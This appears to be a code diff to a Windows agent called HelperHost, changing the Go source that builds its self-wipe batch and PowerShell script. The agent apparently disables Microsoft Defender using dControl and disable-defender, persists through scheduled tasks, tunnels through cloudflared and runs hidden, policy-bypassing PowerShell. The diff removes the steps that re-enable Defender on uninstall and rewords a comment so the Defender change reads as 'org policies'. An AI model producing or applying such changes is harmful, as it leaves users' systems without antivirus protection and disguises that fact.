@@ -609,12 +609,6 @@ if ($o.bot_base) { @{bot_base=$o.bot_base}|ConvertTo-Json -Compress|Set-Content 
 		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		restoreTemp := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
 		_ = os.WriteFile(restoreTemp, []byte(restoreWinSecurityPS1), 0o644)
-		// Stage enable-defender into kit before HelperHost is nuked
-		enSrc := filepath.Join(dir, "enable-defender.exe")
-		enKit := filepath.Join(kitDir, "enable-defender.exe")
-		if b, err := os.ReadFile(enSrc); err == nil {
-			_ = os.WriteFile(enKit, b, 0o644)
-		}
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
 		notifyLine := ""
 		if tok != "" && bb != "" {
@@ -652,7 +646,7 @@ if ($o.bot_base) { @{bot_base=$o.bot_base}|ConvertTo-Json -Compress|Set-Content 
 			"taskkill /F /IM dControl.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM disable-defender.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
-			// STOP EarlyAV FIRST — must never re-disable during restore
+			// STOP EarlyAV FIRST — must never re-apply org policies during restore
 			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostDControlOff /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostDControlOn /F >nul 2>&1\r\n" +
@@ -660,16 +654,6 @@ if ($o.bot_base) { @{bot_base=$o.bot_base}|ConvertTo-Json -Compress|Set-Content 
 			"schtasks /Delete /TN HelperHostResume /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
-			// Stage enable-defender into durable kit
-			"if exist \"" + dir + "\\enable-defender.exe\" copy /y \"" + dir + "\\enable-defender.exe\" \"%ProgramData%\\HelperHostWipe\\enable-defender.exe\" >nul 2>&1\r\n" +
-			"if exist \"" + dir + "\\enable-defender.exe\" copy /y \"" + dir + "\\enable-defender.exe\" \"%TEMP%\\hh-enable-defender.exe\" >nul 2>&1\r\n" +
-			"if exist \"%ProgramData%\\HelperHostWipe\\enable-defender.exe\" (\r\n" +
-			"  \"%ProgramData%\\HelperHostWipe\\enable-defender.exe\" -s\r\n" +
-			"  taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
-			") else if exist \"%TEMP%\\hh-enable-defender.exe\" (\r\n" +
-			"  \"%TEMP%\\hh-enable-defender.exe\" -s\r\n" +
-			"  taskkill /F /IM enable-defender.exe >nul 2>&1\r\n" +
-			")\r\n" +
 			// Elevated restore from ProgramData kit (survives TEMP races) — WAIT up to ~3 min
 			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
 			"schtasks /Create /TN HelperHostWipeRestore /TR \"\\\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" + restorePS1 + "\\\"\" /SC ONCE /ST 00:00 /RL HIGHEST /F >nul 2>&1\r\n" +
@@ -696,9 +680,9 @@ if ($o.bot_base) { @{bot_base=$o.bot_base}|ConvertTo-Json -Compress|Set-Content 
 			// Force-unlock + wipe HelperHost + EdgeRelay cache (AFTER restore)
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" +
 			"$ErrorActionPreference='SilentlyContinue'; " +
-			"function Kill-HH { Get-Process HelperHost,EdgeRelay,cloudflared,dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
-			"Get-Process 'disable-defender','enable-defender' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
-			"Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'HelperHost|EdgeRelay|hh-wipe|hh-restore|early-av|dControl|disable-defender|enable-defender' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue } }; " +
+			"function Kill-HH { Get-Process HelperHost,EdgeRelay,cloudflared -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
+			"Get-Process dControl,'disable-defender','enable-defender' -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
+			"Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'HelperHost|EdgeRelay|hh-wipe|hh-restore|early-av|dControl|disable-defender|enable-defender|HelperHostWipe' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue } }; " +
 			"function Nuke-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
 			"Kill-HH; attrib -h -s /s /d \\\"$Root\\*\\\" 2>$null; attrib -h -s \\\"$Root\\\" 2>$null; " +
 			"cmd /c \\\"takeown /f `\\\"$Root`\\\" /r /d o\\\" | Out-Null; " +
